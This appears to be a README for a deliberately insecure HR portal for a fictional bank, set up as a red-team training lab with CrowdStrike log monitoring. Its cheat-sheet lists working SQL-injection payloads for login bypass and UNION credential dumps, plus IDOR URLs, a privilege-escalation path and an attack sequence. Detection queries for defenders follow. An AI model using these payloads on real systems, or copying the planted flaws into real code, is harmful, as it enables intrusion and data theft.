# Senarath Bank — HR Management Portal (Vulnerable Lab Target)

A **deliberately insecure** web application + database for an **authorized,
internal red-team / security-training simulation**. It mimics a corporate
"HR portal" for a *fictional* bank (Senarath Bank) with staff dashboards,
payroll, activity logs and an admin console — and is seeded with **30 synthetic
employees**. Every person, NIC, salary and bank account in it is fake.

> ## ⚠ SAFETY — READ FIRST
> This app has **no real security**. It is built to be broken.
> - Run it **only** on an **isolated, internal lab network** (air-gapped or a
>   host-only / private VLAN). **Never** expose ports 8080 or 3306 to the
>   internet or any production/corporate network.
> - Use it only where you are **authorized** to run offensive testing.
> - Do not put any real personal data into it.
> - Tear it down when the exercise is over (`docker compose down -v`).

---

## 1. Architecture

| Service | Image | Port (host) | Purpose |
|---------|-------|-------------|---------|
| `web`   | `php:8.1-apache` (built from `web/Dockerfile`) | **8080 → 80** | The portal (PHP) |
| `db`    | `mariadb:10.6` | **3306 → 3306** | MySQL/MariaDB backend |

```
HR Management Portal/
├── docker-compose.yml
├── README.md
├── collector/                  # CrowdStrike collector configs (see Section 8)
│   ├── falcon-logscale-collector.yaml
│   ├── fluent-bit.conf
│   └── parsers.conf
├── web/
│   ├── Dockerfile
│   ├── apache-senarath.conf    # mirrors apache logs into /var/log/senarath
│   └── src/            # all PHP (live-mounted into the web container)
│       ├── index.php          # login (SQLi-vulnerable auth)
│       ├── logger.php         # structured NDJSON security logging
│       ├── dashboard.php
│       ├── directory.php      # staff search (UNION SQLi)
│       ├── profile.php        # employee record (IDOR + SQLi)
│       ├── payroll.php        # payslips (IDOR + SQLi)
│       ├── activities.php     # activity + leave (IDOR + SQLi)
│       ├── admin/             # admin console (broken access control)
│       └── assets/css/style.css
└── db/
    ├── init.sql        # schema + 30 synthetic users (auto-loaded on first boot)
    └── gen_init_sql.py # regenerate init.sql if you want fresh fake data
```

---

## 2. Prerequisites (Ubuntu laptop)

Install Docker Engine + the Compose plugin:

```bash
sudo apt update
sudo apt install -y docker.io docker-compose-v2 git
sudo systemctl enable --now docker

# run docker without sudo (log out/in afterwards, or run: newgrp docker)
sudo usermod -aG docker "$USER"
```

Verify:
```bash
docker --version
docker compose version
```

---

## 3. Get the project onto the Ubuntu laptop

Pick whichever fits your setup.

**Option A — copy the folder directly** (USB stick, or `scp` from the dev machine):
```bash
# example: from another machine
scp -r "HR Management Portal" user@lab-laptop:~/senarath-portal
```

**Option B — put it in a git repo first**, then clone on the laptop.
On the dev machine, inside the project folder:
```bash
git init
git add .
git commit -m "Senarath Bank vulnerable HR portal (lab target)"
# push to your INTERNAL git server (not a public host):
git remote add origin git@your-internal-git:lab/senarath-portal.git
git push -u origin master
```
Then on the Ubuntu laptop:
```bash
git clone git@your-internal-git:lab/senarath-portal.git senarath-portal
cd senarath-portal
```

---

## 4. Build & run with Docker

From the project folder on the Ubuntu laptop:

```bash
# create the host log dir under /var/log so the container (www-data) can write to it
sudo mkdir -p /var/log/senarath && sudo chmod 777 /var/log/senarath

docker compose up -d --build
```

First boot takes ~20–40s while MariaDB initialises and loads `db/init.sql`.
Check both containers are healthy:

```bash
docker compose ps
docker compose logs -f db     # wait for: "mysqld: ready for connections"  (Ctrl-C to stop tailing)
```

**Access the portal:**
- Portal:   `http://<laptop-ip>:8080/`   (or `http://localhost:8080/`)
- Database: `<laptop-ip>:3306`  (user `webapp` / `webapp123`, or `root` / `root`)

Find the laptop IP with `ip a`.

### Common commands
```bash
docker compose logs -f web           # tail web logs
docker compose restart web           # restart just the web app
docker compose down                  # stop & remove containers (keeps DB data volume)
docker compose down -v               # stop & WIPE the database (full reset)
docker compose up -d --build         # rebuild after code changes
```

### Reset the database to a clean 30-user state
```bash
docker compose down -v && docker compose up -d --build
```

### Connect to the DB manually (optional)
```bash
docker exec -it senarath_db mariadb -uwebapp -pwebapp123 senarath_hr
# or from the host if you have a mysql client:
mysql -h 127.0.0.1 -P 3306 -uwebapp -pwebapp123 senarath_hr
```

---

## 5. Seeded accounts

Passwords are stored in **plaintext** and are intentionally weak. Notable ones:

| Username   | Password   | Role     |
|------------|------------|----------|
| `admin`    | `admin123` | admin    |
| `hrmanager`| `welcome1` | manager  |
| `auditor`  | `audit@123`| manager  |

...plus 27 more `employee`/`manager` accounts. You can read **all** of them
(and their passwords) from the admin console, or dump them via SQL injection —
that's part of the exercise.

---

## 6. Vulnerability cheat-sheet (all payloads verified)

> For blue-team/debrief use. These are the planted weaknesses and working
> payloads. `--␣` means a double-dash followed by a **space**.

### A. SQL injection — authentication bypass  (`index.php`)
Login form; the query is `... WHERE username='<u>' AND password='<p>'`.
In the **username** field (any password):
```
admin' -- 
' OR '1'='1' -- 
' OR 1=1 LIMIT 1 -- 
```
`admin' -- ` logs you straight in as the administrator.

### B. SQL injection — error-based  (`index.php`, `directory.php`, …)
A single quote surfaces the raw MariaDB error (DB fingerprinting):
```
username:  x'
directory search q:  x'
```

### C. SQL injection — UNION / data exfiltration  (`directory.php`)
Search returns **6 columns**. Dump every credential:
```
zzz' UNION SELECT 1,CONCAT(username,0x3a,password),department,position,email,phone FROM users -- 
```
Fingerprint the backend:
```
zzz' UNION SELECT 1,CONCAT(@@version,0x20,database(),0x20,current_user()),3,4,5,6 -- 
```

### D. IDOR — Insecure Direct Object Reference  (`profile.php`, `payroll.php`, `activities.php`)
Any logged-in user can read anyone's full HR record / payslips by changing the id:
```
profile.php?id=1          # the admin's NIC, address, bank account
payroll.php?user_id=1     # the admin's salary history
activities.php?user_id=7
```
These params are also directly SQL-injectable.

### E. Broken access control / privilege escalation  (`admin/`)
The admin console only checks that you are **logged in**, never that your role
is `admin`. So any authenticated session — including one obtained via the SQLi
bypass in (A) — can reach:
```
admin/index.php     # org-wide overview
admin/users.php     # full staff dump incl. PLAINTEXT passwords, NIC, bank a/c; delete accounts
admin/edit_user.php?id=<n>   # edit any account; set role=admin  => privilege escalation
```
The edit form writes every field (including `role`) back with raw string
concatenation, so it is SQL-injectable too.

### F. Supporting weaknesses
- Passwords stored and compared in **plaintext** (no hashing).
- Verbose SQL/PHP errors enabled (`display_errors=On`) — aids error-based SQLi.
- No CSRF tokens, no session regeneration on login, no rate limiting / lockout.
- DB port **3306 exposed** to the host with weak creds (`webapp`/`webapp123`, `root`/`root`).
- Reflected input in several places (XSS practice if you remove the `htmlspecialchars` guards).

---

## 7. Suggested red-team flow

1. Recon the login → try `'` → confirm error-based SQLi.
2. Bypass auth with `admin' -- `.
3. From the staff directory, UNION-dump all credentials.
4. Walk IDOR on `profile.php?id=` to harvest PII (NIC, bank accounts).
5. Reach the admin console (broken access control), exfiltrate the full staff
   table, then escalate a low-priv account to `admin` via `edit_user.php`.
6. Blue team: capture the activity logs, DB query logs, and web logs; write
   detections for the payloads above.

---

---

## 8. Log monitoring → CrowdStrike (NG-SIEM / Falcon LogScale)

The portal is instrumented so a collector can forward its activity to
CrowdStrike for the blue team to monitor during the exercise. **Logging only
records events — it never blocks or sanitises anything, so the app stays fully
vulnerable.**

### 8.1 What gets written, and where

All logs land in `/var/log/senarath/` on the Ubuntu host (under the standard
system log directory, the same convention as `/var/log/apache2`):

| File | Format | Contents |
|------|--------|----------|
| `/var/log/senarath/app.log` | **NDJSON** (one JSON object per line) | Structured security events (auth, data access, admin, SQL errors) |
| `/var/log/senarath/apache_access.log` | Apache combined + `%D` | Every HTTP request — GET-based SQLi payloads appear in the query string |
| `/var/log/senarath/apache_error.log` | Apache error log | PHP warnings / server errors |

Each app event is **also** mirrored to the container's stderr, so it's
available a second way via the Docker json-file driver:
```bash
docker logs -f senarath_web
```

NDJSON is what LogScale / NG-SIEM parse natively — point a `json` parser at
`app.log` and every field below becomes queryable.

### 8.2 Event schema (`app.log`)

Common fields on every event:

| Field | Example | Notes |
|-------|---------|-------|
| `timestamp` | `2026-10-28T14:02:11Z` | UTC ISO-8601 — map this as the event time |
| `app` / `env` / `host` | `senarath-hr` / `lab` / `senarath_web` | source identity |
| `src_ip`, `x_forwarded_for` | `10.10.0.5` | attacker IP |
| `user_agent`, `http_method`, `http_path` | | request context |
| `session_user`, `session_uid`, `session_role` | `admin` / `1` / `admin` | who is logged in |
| `event_category` | `authentication` \| `data_access` \| `admin` \| `error` | |
| `event_action` | see below | the specific action |
| `severity` | `info` \| `warning` \| `high` | |
| `outcome` | `success` \| `failure` \| `error` | |

Detection flags (boolean — these are your high-signal hunting pivots):

| Flag | Fires when |
|------|-----------|
| `sqli_suspected` | input contains SQLi markers (`'`, `UNION`, `--`, `OR 1=1`, `information_schema`, …) |
| `auth_bypass_suspected` | login **succeeded** *and* the input looked like SQLi → likely auth bypass |
| `idor_suspected` | a user read a `profile` / `payroll` / `activity` record that isn't their own |
| `broken_access_suspected` | a **non-admin** session reached the admin console |
| `privesc_suspected` | an account's role was raised to `admin` |

`event_action` values: `login_success`, `login_failure`, `sql_error`,
`staff_search`, `view_profile`, `view_payroll`, `view_activity`,
`admin_access`, `staff_dump`, `account_update`, `privilege_change`,
`account_delete`.

Example line (SQLi auth bypass):
```json
{"timestamp":"2026-10-28T14:02:11Z","app":"senarath-hr","env":"lab","host":"senarath_web","src_ip":"10.10.0.5","http_method":"POST","http_path":"/index.php","event_category":"authentication","event_action":"login_success","severity":"high","outcome":"success","actor":"admin","actor_uid":1,"actor_role":"admin","attempt_user":"admin' -- ","auth_bypass_suspected":true}
```

### 8.3 Point the collector at the logs

Configs are in `collector/` and read the logs straight from
`/var/log/senarath/` on the host (no symlink needed).

**Option 1 — Falcon LogScale Collector (CrowdStrike-native).**
Download the Linux collector from your Falcon console
(*Next-Gen SIEM / LogScale → Log collectors*), then use
`collector/falcon-logscale-collector.yaml`. Fill in `<LOGSCALE_ENDPOINT>` and
`<INGEST_TOKEN>` from your tenant, and assign the built-in **`json`** parser to
the ingest token so `app.log` fields are extracted.

**Option 2 — Fluent Bit.**
```bash
sudo apt-get install -y fluent-bit
fluent-bit -c /opt/senarath/collector/fluent-bit.conf
```
Fill in `<LOGSCALE_HOST>` and `<INGEST_TOKEN>`; it ships to LogScale's
HEC-compatible ingest endpoint.

> The exact sink type, endpoint path and token location vary by CrowdStrike
> tenant and collector version — confirm them against your Falcon console.
> The log **format** (NDJSON with the fields above) is the part that matters
> and is collector-agnostic.

### 8.4 Example detections (LogScale / NG-SIEM query syntax)

```
// SQL-injection auth bypass
event_action=login_success auth_bypass_suspected=true

// Any SQLi attempt across the app
sqli_suspected=true | groupBy([src_ip, event_action])

// IDOR — users pulling records that aren't theirs
idor_suspected=true | groupBy([session_user, target_user_id])

// Privilege escalation to admin
event_action=privilege_change privesc_suspected=true

// Broken access control — non-admin in the admin console
broken_access_suspected=true
```

---

*Senarath Bank is fictional. All data is synthetic. For authorized security
training only.*
